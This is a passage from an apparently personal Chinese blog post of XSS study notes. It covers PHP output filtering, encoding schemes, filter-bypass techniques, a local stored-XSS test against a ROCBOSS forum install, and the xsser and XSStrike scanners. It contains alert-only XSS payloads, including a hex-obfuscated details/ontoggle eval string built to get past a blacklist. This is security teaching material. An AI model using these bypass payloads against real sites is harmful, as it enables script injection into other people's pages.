<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140808003.png" alt="image-20200416140808003"></p>
<p>在页面运行，返回了scipt的字符串，如果不加过滤就会弹出document.domain的内容<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140853720.png" alt="image-20200416140853720"></p>
<h5 id="3、strip-tags-函数"><a href="#3、strip-tags-函数" class="headerlink" title="3、strip_tags()函数"></a>3、strip_tags()函数</h5><p>strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签</p>
<p>注释：该函数始终会剥离HTML注释。这点无法通过allow参数改变</p>
<p>注释：该函数是二进制安全的</p>
<p>strip_tags(string,allow)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_strip_tags.asp</a></p>
<p>更改代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416141524570.png" alt="image-20200416141524570"></p>
<p>可以发现，他是直接删除了，JS的script标签，而不是进行了实体转换</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142010850.png" alt="image-20200416142010850"></p>
<h5 id="4、自定义xss-filter"><a href="#4、自定义xss-filter" class="headerlink" title="4、自定义xss filter"></a>4、自定义xss filter</h5><p>在网上有很多自定义的xss filter，进行自行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142307890.png" alt="image-20200416142307890"></p>
<p>加入该函数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142630506.png" alt="image-20200416142630506"></p>
<p>在页面中打开，去除了script标签</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142658469.png" alt="image-20200416142658469"></p>
<h4 id="编码转义介绍"><a href="#编码转义介绍" class="headerlink" title="编码转义介绍"></a>编码转义介绍</h4><h5 id="1、URL编码"><a href="#1、URL编码" class="headerlink" title="1、URL编码"></a>1、URL编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165118729.png" alt="image-20200416165118729"></p>
<p>百分号编码：url编码包含一个百分号（%），后面跟着两个标识字符的ascii码的十六进制数，例如：空格转换为”%20”。</p>
<h5 id="2、html编码"><a href="#2、html编码" class="headerlink" title="2、html编码"></a>2、html编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165359455.png" alt="image-20200416165359455"></p>
<p>实体编码：一般以”&amp;”开头，” ; “结尾，可以不加” ; “。如：“&lt;”转为“&lt;”</p>
<p>进制编码：以“&amp;#”开头，加上字符的数值，以” ; “结尾，可以不加“;”。字符的数值可以是任意十进制的ascii码，或unicode字符编码。十六进制的数值需要在编码数字前加“x”。如：“&lt;”转换为十进制的“&lt;”或十六进制的”&lt;”</p>
<h5 id="3、javascrip编码"><a href="#3、javascrip编码" class="headerlink" title="3、javascrip编码"></a>3、javascrip编码</h5><p>数字形式：\u后面加4位16进制数字（或\x后加2位16进制数字），按字符的uncode数据编码，不足位数以零填充，如：“&lt;”转为”\u003c”或者”\x3c”。其中”\u”开头的unicode转义方式可以在字符串之外的位置，其他的不可以</p>
<p>jsfuck：<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p>
<h5 id="4、编码含义"><a href="#4、编码含义" class="headerlink" title="4、编码含义"></a>4、编码含义</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416170820749.png" alt="image-20200416170820749"></p>
<h4 id="XSS过滤器绕过"><a href="#XSS过滤器绕过" class="headerlink" title="XSS过滤器绕过"></a>XSS过滤器绕过</h4><h5 id="1、本地环境搭建"><a href="#1、本地环境搭建" class="headerlink" title="1、本地环境搭建"></a>1、本地环境搭建</h5><p>在web程序中找到过滤的函数，然后拷贝到本地环境搭建完成</p>
<p>xss filter中的代码，加入了红框部分的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195054147.png" alt="image-20200416195054147"></p>
<p>在页面查看发现成功将script标签删除掉了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195258557.png" alt="image-20200416195258557"></p>
<h5 id="2、xss-payload测试"><a href="#2、xss-payload测试" class="headerlink" title="2、xss payload测试"></a>2、xss payload测试</h5><p>kali linux下自带字典，在CTF比赛中经常使用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195713132.png" alt="image-20200416195713132"></p>
<p>这里肯定使用的是XSS.txt。</p>
<h5 id="3、自动化工具测试"><a href="#3、自动化工具测试" class="headerlink" title="3、自动化工具测试"></a>3、自动化工具测试</h5><p>可以使用burpsuite进行自动化探测，将字典放进去让其自己执行筛选</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416200741297.png" alt="image-20200416200741297"></p>
<h5 id="4、关注最新HTML内容"><a href="#4、关注最新HTML内容" class="headerlink" title="4、关注最新HTML内容"></a>4、关注最新HTML内容</h5><p>在进行XSS过程中一定要关注最新的HTML，尤其是新加入的标签，可能会被过滤导致XSS触发</p>
<p>例如HTML5中新标签</p>
<p><code>&lt;video src=1 onerror=alert(1)&gt;</code></p>
<p><code>&lt;audio src=1 onerror=alert(1)&gt;</code></p>
<p>参考：<a href="https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
<h4 id="XSS发生的位置"><a href="#XSS发生的位置" class="headerlink" title="XSS发生的位置"></a>XSS发生的位置</h4><h5 id="1、GET型URL中的XSS"><a href="#1、GET型URL中的XSS" class="headerlink" title="1、GET型URL中的XSS"></a>1、GET型URL中的XSS</h5><p>如果在URL中提交参数值，在页面中显示。很有可能存在XSS</p>
<p>这种就可以在输入框中直接输入xss代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203528298.png" alt="image-20200416203528298"></p>
<h5 id="2、POST型表单中的XSS"><a href="#2、POST型表单中的XSS" class="headerlink" title="2、POST型表单中的XSS"></a>2、POST型表单中的XSS</h5><p>如果在表单中提交的参数值，在页面中显示。很有可能存在XSS</p>
<p>表单提交在页面显示结果，但在URL没有显示结果在响应中是Form Data表示表单数据，这时候他一定是一个POST提交参数</p>
<p>还是直接在输入框直接输入XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203725722.png" alt="image-20200416203725722"></p>
<h5 id="3、JSON中的XSS"><a href="#3、JSON中的XSS" class="headerlink" title="3、JSON中的XSS"></a>3、JSON中的XSS</h5><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率</p>
<p>JSON最常用的格式是对象的键值对。例如：</p>
<p>{“firstName”:”Brett”,”lastName”:”McLaughlin”}</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416205446505.png" alt="image-20200416205446505"></p>
<h5 id="4、自定义HTTP头中的XSS"><a href="#4、自定义HTTP头中的XSS" class="headerlink" title="4、自定义HTTP头中的XSS"></a>4、自定义HTTP头中的XSS</h5><p>如果在HTTP自定义头中提交的参数值，在页面中显示。很有可能就存在XSS</p>
<p>进行抓包，发送到repeater模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210453280.png" alt="image-20200416210453280"></p>
<p>在里面定义一个bwapp然后运行，页面返回信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210905870.png" alt="image-20200416210905870"></p>
<p>改为XSS内容，执行，在代码中复制连接在页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211039263.png" alt="image-20200416211039263"></p>
<p>页面成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211147311.png" alt="image-20200416211147311"></p>
<h4 id="存储型XSS漏洞挖掘灰盒测试"><a href="#存储型XSS漏洞挖掘灰盒测试" class="headerlink" title="存储型XSS漏洞挖掘灰盒测试"></a>存储型XSS漏洞挖掘灰盒测试</h4><h5 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h5><p>使用phpStudy搭建 微社区程序-4-4—ROCBOSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085414839.png" alt="image-20200417085414839"></p>
<h5 id="2、定向XSS挖掘"><a href="#2、定向XSS挖掘" class="headerlink" title="2、定向XSS挖掘"></a>2、定向XSS挖掘</h5><p>XSS漏洞可以存在于个人资料处，文章发表处或者留言评论处等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085758601.png" alt="image-20200417085758601"></p>
<h5 id="3、黑名单审计"><a href="#3、黑名单审计" class="headerlink" title="3、黑名单审计"></a>3、黑名单审计</h5><p>私信位置没有被实体化，可以进行XSS，但是被黑名单过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090319747.png" alt="image-20200417090319747"></p>
<p>查看过滤的名单，没有过滤details和ontaggle</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090643047.png" alt="image-20200417090643047"></p>
<h5 id="4、绕过过滤，触发XSS"><a href="#4、绕过过滤，触发XSS" class="headerlink" title="4、绕过过滤，触发XSS"></a>4、绕过过滤，触发XSS</h5><p>已知过滤了javascript，构造了payload</p>
<p>因为javascript会被过滤掉，所以使用16进制进行绕过</p>
<p>打开details就会出发ontoggle事件</p>
<p><code>&quot;&gt;&lt;details open ontoggle=eval(&quot;\x6a\x61\x76\x61\x76\x61\x73\x63\x72\x69\x70\x74\x76\x3aalert(&#39;xss&#39;)&quot;)&gt;&lt;&quot;</code></p>
<p>进行私信发送</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091315408.png" alt="image-20200417091315408"></p>
<p>成功弹出XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091334674.png" alt="image-20200417091334674"></p>
<h4 id="自动化XSS挖掘工具—xsser"><a href="#自动化XSS挖掘工具—xsser" class="headerlink" title="自动化XSS挖掘工具—xsser"></a>自动化XSS挖掘工具—xsser</h4><h5 id="1、xsser工具介绍"><a href="#1、xsser工具介绍" class="headerlink" title="1、xsser工具介绍"></a>1、xsser工具介绍</h5><p>xsser是一款针对web应用程序自动化挖掘、利用、报告xss漏洞的框架，kali下自带了xsser</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092125950.png" alt="image-20200417092125950"></p>
<h5 id="2、xsser工具原理"><a href="#2、xsser工具原理" class="headerlink" title="2、xsser工具原理"></a>2、xsser工具原理</h5><p>原理</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092243656.png" alt="image-20200417092243656"></p>
<h5 id="3、xsser帮助信息"><a href="#3、xsser帮助信息" class="headerlink" title="3、xsser帮助信息"></a>3、xsser帮助信息</h5><p>xsser -h</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093057564.png" alt="image-20200417093057564"></p>
<p>注意：使用命令行工具时，不需要全部记忆参数，只需要熟练或用到时查找即可</p>
<h5 id="4、xsser启动方式"><a href="#4、xsser启动方式" class="headerlink" title="4、xsser启动方式"></a>4、xsser启动方式</h5><p>xsser启动方式可以分为命令行启动、图形化界面启动</p>
<p>在终端中以图形化界面启动输入</p>
<p><code>xsser --gtk</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093744922.png" alt="image-20200417093744922"></p>
<h4 id="XSS-fuzzing工具"><a href="#XSS-fuzzing工具" class="headerlink" title="XSS fuzzing工具"></a>XSS fuzzing工具</h4><h5 id="1、XSStrike工具介绍"><a href="#1、XSStrike工具介绍" class="headerlink" title="1、XSStrike工具介绍"></a>1、XSStrike工具介绍</h5><p>XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p>
<p>项目地址：<a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
<h5 id="2、XSStrike工具安装"><a href="#2、XSStrike工具安装" class="headerlink" title="2、XSStrike工具安装"></a>2、XSStrike工具安装</h5><p>XSStrike只能运行在py3.6以上版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095550503.png" alt="image-20200417095550503"></p>
<h5 id="3、XSStrike帮助信息"><a href="#3、XSStrike帮助信息" class="headerlink" title="3、XSStrike帮助信息"></a>3、XSStrike帮助信息</h5><p>xsstrike -h查看帮助信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095751376.png" alt="image-20200417095751376"></p>
<h5 id="4、XSStrike实例演示"><a href="#4、XSStrike实例演示" class="headerlink" title="4、XSStrike实例演示"></a>4、XSStrike实例演示</h5><p>python3 xsstrike.py -u “URL”</p>
<p>例如：</p>
<p>​    python3 xsstrike.py -u “<a href="http://192.168.1.102/xss-labs/level1.php?name=test&quot;" target="_blank" rel="noopener">http://192.168.1.102/xss-labs/level1.php?name=test&quot;</a>    </p>
<p>如果浏览器过滤的xss需要关闭xss筛选器</p>
<p>复制payload在浏览器的值后面输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417101428690.png" alt="image-20200417101428690"></p>

      
    </div>
    
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2020/04/12/Html/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">Html</div>
      <strong class="article-nav-caption">&gt;</strong>
    </a>
  
</nav>

  
</article>


<div class="ds-share share" data-thread-key="XSS" data-title="XSS" data-url="https://zhanqiaozai.github.io/2020/04/20/XSS/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="XSS">
    <div class="ds-share-inline">
      <ul  class="ds-share-icons-16">
      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
      </ul>
      <div class="ds-share-icons-more">
      </div>
    </div>
 </div>
 





</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2020 zhanqiaozai
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>